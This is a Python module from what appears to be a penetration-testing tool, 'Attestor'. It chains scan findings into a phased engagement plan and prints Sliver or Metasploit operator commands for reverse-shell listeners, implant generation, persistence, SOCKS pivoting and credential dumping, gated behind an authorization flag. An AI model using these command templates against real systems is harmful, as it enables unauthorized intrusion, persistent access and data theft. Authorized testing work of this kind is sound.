#!/usr/bin/env python3
"""Engagement planner -- chain ALL findings into a phased operation plan.

This is the "fully implement Sliver/MSF in Attestor" module. Instead of mapping
one finding to one command, it takes EVERY confirmed finding from a scan, chains
them into a real engagement plan with phases, and maps each phase to concrete
operator commands for your C2 framework (Sliver or Metasploit).

Phases (real pentest structure):
  0. RECON     -- nmap service/version scan, what the target exposes
  1. ACCESS    -- initial foothold via the highest-confidence RCE finding
  2. ESTABLISH -- implant delivery through the access primitive
  3. PERSIST   -- persistence mechanisms based on what other findings reveal
  4. DISCOVER  -- post-session enumeration informed by non-RCE findings
  5. MOVE      -- lateral movement if findings span multiple services/hosts
  6. OBJECTIVE -- data access / proof-of-concept for the engagement report

House contract (offensive lane):
- PLANNER ONLY. Writes a phased command template. Never starts a listener, never
  generates implants, never connects to anything. The operator runs each phase
  in their own C2 console.
- Gated behind --yes-authorized; not in the default CLI.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
from dataclasses import dataclass, field

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

BANNER = "  [Engagement Planner] Full-phase operation plan for AUTHORIZED targets only.\n"

_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

_ACCESS_TYPES = {"command_injection", "code_injection", "deserialization", "file_upload"}
_DISCOVER_TYPES = {"sql_injection", "path_traversal", "ssrf", "xss",
                   "information_disclosure", "idor"}
_PERSIST_INDICATORS = {"file_upload", "command_injection", "code_injection"}


@dataclass
class Finding:
    raw: dict
    cls: str
    cwe: str
    file: str
    line: int
    severity: str
    reachable: bool = True
    entry: str = ""


@dataclass
class Phase:
    name: str
    objective: str
    findings: list[Finding] = field(default_factory=list)
    commands_sliver: list[str] = field(default_factory=list)
    commands_msf: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


@dataclass
class EngagementPlan:
    target: str
    lhost: str
    lport: str
    os: str
    c2: str
    phases: list[Phase] = field(default_factory=list)
    all_findings: list[Finding] = field(default_factory=list)


def _classify_finding(f: dict) -> Finding:
    cls = (f.get("sink_type") or f.get("category") or f.get("vulnerability") or
           "unknown").lower().replace("-", "_")
    return Finding(
        raw=f, cls=cls,
        cwe=f.get("cwe") or f.get("sink_cwe") or "",
        file=f.get("sink_file") or f.get("file") or "",
        line=int(f.get("sink_line") or f.get("line") or 0),
        severity=f.get("severity") or "MEDIUM",
        reachable=f.get("reachable", True),
        entry=f.get("entry_point") or "",
    )


def _pick_access(findings: list[Finding]) -> list[Finding]:
    access = [f for f in findings if f.cls in _ACCESS_TYPES and f.reachable]
    access.sort(key=lambda f: _SEV_ORDER.get(f.severity, 3))
    return access


def _pick_discover(findings: list[Finding]) -> list[Finding]:
    return [f for f in findings if f.cls in _DISCOVER_TYPES]


def _pick_persist(findings: list[Finding]) -> list[Finding]:
    return [f for f in findings if f.cls in _PERSIST_INDICATORS]


def _phase_recon(plan: EngagementPlan) -> Phase:
    p = Phase(name="RECON", objective="Map the target's attack surface")
    if plan.c2 == "sliver":
        p.commands_sliver = [
            f"# run nmap OUTSIDE the Sliver console (separate terminal):",
            f"# nmap -sV -sC -p- {plan.target} -oA recon_{plan.target.replace('.','_')}",
            "# then review open ports, services, and versions",
        ]
    else:
        p.commands_msf = [
            f"db_nmap -sV -sC {plan.target}",
            "hosts", "services",
        ]
    p.notes = ["identify web apps, APIs, databases, and admin interfaces"]
    return p


def _phase_access(plan: EngagementPlan, access: list[Finding]) -> Phase:
    p = Phase(name="INITIAL ACCESS", objective="Get first execution on the target",
              findings=access)
    if not access:
        p.notes = ["no RCE-class finding confirmed -- manual access required"]
        return p
    best = access[0]
    base = os.path.basename(best.file)
    p.notes = [
        f"primary: {best.cls} ({best.cwe}) at {base}:{best.line}",
        f"  severity {best.severity}, entry: {best.entry or 'direct'}",
    ]
    if len(access) > 1:
        p.notes.append(f"  fallback: {len(access)-1} other RCE-class finding(s) available")
    p.notes.append("use this execution primitive to deliver the implant (next phase)")
    return p


def _phase_establish(plan: EngagementPlan) -> Phase:
    p = Phase(name="ESTABLISH", objective="Deliver and run the C2 implant")
    if plan.c2 == "sliver":
        p.commands_sliver = [
            f"# start a listener (in the sliver console):",
            f"https --lhost {plan.lhost} --lport {plan.lport}",
            "",
            f"# generate the implant:",
            f"generate --http {plan.lhost} --os {plan.os} --save ./implant",
            "",
            "# deliver implant through the access primitive above,",
            "# then confirm the session lands:",
            "sessions",
        ]
    else:
        p.commands_msf = [
            "use exploit/multi/handler",
            f"set PAYLOAD {_msf_payload(plan.os)}",
            f"set LHOST {plan.lhost}",
            f"set LPORT {plan.lport}",
            "# run -j",
            "",
            "# deliver through the access primitive, then:",
            "sessions",
        ]
    return p


def _phase_persist(plan: EngagementPlan, persist: list[Finding]) -> Phase:
    p = Phase(name="PERSIST", objective="Survive reboots / maintain access",
              findings=persist)
    if plan.c2 == "sliver":
        p.commands_sliver = [
            "# once you have a session:",
            "use <session-id>",
            "",
            "# service persistence (Windows):",
            f"# generate --http {plan.lhost} --os windows --format service --save ./svc_implant",
            "# then install via the session's execute command",
        ]
    else:
        p.commands_msf = [
            "# from an active session:",
            "use post/windows/manage/persistence_exe" if plan.os == "windows"
            else "use post/linux/manage/cron_persistence",
            "# set SESSION <id>",
            "# run",
        ]
    if persist:
        p.notes = [f"{len(persist)} finding(s) offer additional persistence vectors"]
        for f in persist[:3]:
            p.notes.append(f"  - {f.cls} ({f.cwe}) at {os.path.basename(f.file)}:{f.line}")
    else:
        p.notes = ["no additional persistence vectors from findings -- use standard techniques"]
    return p


def _phase_discover(plan: EngagementPlan, discover: list[Finding]) -> Phase:
    p = Phase(name="DISCOVER", objective="Enumerate from the session, guided by findings",
              findings=discover)
    if plan.c2 == "sliver":
        p.commands_sliver = [
            "# from an active session:",
            "use <session-id>",
            "info",
            "ifconfig",
            "netstat",
            "ps",
        ]
    else:
        p.commands_msf = [
            "sysinfo", "ipconfig" if plan.os == "windows" else "ifconfig",
            "route", "arp",
        ]
    if discover:
        p.notes = [f"{len(discover)} non-RCE finding(s) guide enumeration:"]
        for f in discover[:5]:
            if f.cls == "sql_injection":
                p.notes.append(f"  - SQLi ({f.cwe}) at {os.path.basename(f.file)}:{f.line}"
                              " -> enumerate databases, dump credentials")
            elif f.cls == "ssrf":
                p.notes.append(f"  - SSRF ({f.cwe}) at {os.path.basename(f.file)}:{f.line}"
                              " -> probe internal services, cloud metadata")
            elif f.cls == "path_traversal":
                p.notes.append(f"  - path traversal ({f.cwe}) at {os.path.basename(f.file)}:{f.line}"
                              " -> read config files, credentials")
            else:
                p.notes.append(f"  - {f.cls} ({f.cwe}) at {os.path.basename(f.file)}:{f.line}")
    return p


def _phase_move(plan: EngagementPlan) -> Phase:
    p = Phase(name="LATERAL MOVEMENT", objective="Pivot to other hosts/services")
    if plan.c2 == "sliver":
        p.commands_sliver = [
            "# from an active session:",
            "use <session-id>",
            "",
            "# pivot: set up a SOCKS proxy through the session:",
            "socks5 start",
            "# then use proxychains on your operator box to reach internal targets",
        ]
    else:
        p.commands_msf = [
            "# from an active session:",
            "use post/multi/manage/autoroute",
            "# set SESSION <id>",
            "# run",
            "",
            "use auxiliary/server/socks_proxy",
            "# run",
        ]
    p.notes = ["pivot through the session to reach internal services discovered above"]
    return p


def _phase_objective(plan: EngagementPlan, discover: list[Finding]) -> Phase:
    p = Phase(name="OBJECTIVE", objective="Prove impact for the engagement report")
    sqli = [f for f in discover if f.cls == "sql_injection"]
    if sqli:
        p.notes.append("SQLi findings present -> demonstrate data access (credentials, PII)")
    p.notes += [
        "collect evidence: screenshots, credential dumps (hashed), config files",
        "document the full attack path: recon -> access -> establish -> objective",
        "this is your engagement proof-of-concept",
    ]
    return p


def _msf_payload(os_target: str) -> str:
    return {"windows": "windows/meterpreter/reverse_tcp",
            "linux": "linux/x64/meterpreter/reverse_tcp",
            "macos": "osx/x64/meterpreter/reverse_tcp"}.get(os_target,
            "windows/meterpreter/reverse_tcp")


def plan(findings: list[dict], target: str, lhost: str, lport: str,
         os_target: str = "windows", c2: str = "sliver") -> EngagementPlan:
    classified = [_classify_finding(f) for f in findings]
    access = _pick_access(classified)
    discover = _pick_discover(classified)
    persist = _pick_persist(classified)

    ep = EngagementPlan(target=target, lhost=lhost, lport=lport, os=os_target,
                        c2=c2, all_findings=classified)
    ep.phases = [
        _phase_recon(ep),
        _phase_access(ep, access),
        _phase_establish(ep),
        _phase_persist(ep, persist),
        _phase_discover(ep, discover),
        _phase_move(ep),
        _phase_objective(ep, discover),
    ]
    return ep


def render(ep: EngagementPlan) -> str:
    lines = [
        BANNER,
        f"  Target: {ep.target}   C2: {ep.c2}   OS: {ep.os}",
        f"  Operator: {ep.lhost}:{ep.lport}",
        f"  Findings: {len(ep.all_findings)} total, "
        f"{sum(1 for f in ep.all_findings if f.cls in _ACCESS_TYPES)} RCE-class, "
        f"{sum(1 for f in ep.all_findings if f.cls in _DISCOVER_TYPES)} discovery-class",
        "  " + "=" * 62,
    ]
    for i, p in enumerate(ep.phases):
        lines.append(f"\n  Phase {i}: {p.name}")
        lines.append(f"  objective: {p.objective}")
        cmds = p.commands_sliver if ep.c2 == "sliver" else p.commands_msf
        if cmds:
            lines.append("  commands:")
            for c in cmds:
                lines.append(f"    {c}")
        for n in p.notes:
            lines.append(f"  {n}")
        if p.findings:
            lines.append(f"  ({len(p.findings)} finding(s) mapped to this phase)")
    return "\n".join(lines)


def to_script(ep: EngagementPlan) -> str:
    lines = [
        f"# Attestor Engagement Plan -- {ep.c2.upper()}",
        f"# Target: {ep.target}  LHOST: {ep.lhost}  LPORT: {ep.lport}  OS: {ep.os}",
        f"# {len(ep.all_findings)} finding(s) chained into {len(ep.phases)} phases",
        "# AUTHORIZED TESTING ONLY. Run each section yourself.",
        "",
    ]
    for i, p in enumerate(ep.phases):
        lines.append(f"# === Phase {i}: {p.name} === ({p.objective})")
        cmds = p.commands_sliver if ep.c2 == "sliver" else p.commands_msf
        for c in cmds:
            lines.append(c)
        for n in p.notes:
            lines.append(f"# {n}")
        lines.append("")
    return "\n".join(lines)


def _load_findings(args) -> list[dict]:
    if args.findings:
        with open(args.findings, encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, list) else data.get("results", data.get("findings", []))
    if args.scan:
        try:
            import reachability
            ann = reachability.scan([args.scan])
            return reachability.to_dict(ann)
        except Exception:
            import dataflow
            return dataflow.to_dict(dataflow.scan_paths([args.scan]))
    return []


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        prog="attestor-engage",
        description="Full engagement planner from Attestor findings (authorized use only).",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--findings", help="JSON findings file")
    src.add_argument("--scan", help="scan a code path to derive findings")
    ap.add_argument("--target", default="TARGET", help="authorized target host")
    ap.add_argument("--lhost", default="LHOST", help="your listener IP")
    ap.add_argument("--lport", default="443", help="your listener port")
    ap.add_argument("--os", default="windows", choices=["windows", "linux", "macos"])
    ap.add_argument("--c2", default="sliver", choices=["sliver", "msf"],
                    help="C2 framework (default: sliver)")
    ap.add_argument("--out", "-o", help="write the script to a file")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--yes-authorized", action="store_true",
                    help="confirm you are authorized to test the target")
    args = ap.parse_args(argv)

    if not args.yes_authorized:
        sys.stderr.write(BANNER)
        sys.stderr.write("  Refusing without --yes-authorized.\n")
        return 2

    findings = _load_findings(args)
    ep = plan(findings, args.target, args.lhost, args.lport, args.os, args.c2)

    if args.out:
        with open(args.out, "w", encoding="utf-8") as f:
            f.write(to_script(ep) + "\n")
        sys.stderr.write(f"  wrote {args.out}\n")

    if args.json:
        print(json.dumps({"target": ep.target, "c2": ep.c2, "os": ep.os,
                          "phases": len(ep.phases), "findings": len(ep.all_findings)}, indent=2))
    else:
        print(render(ep))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())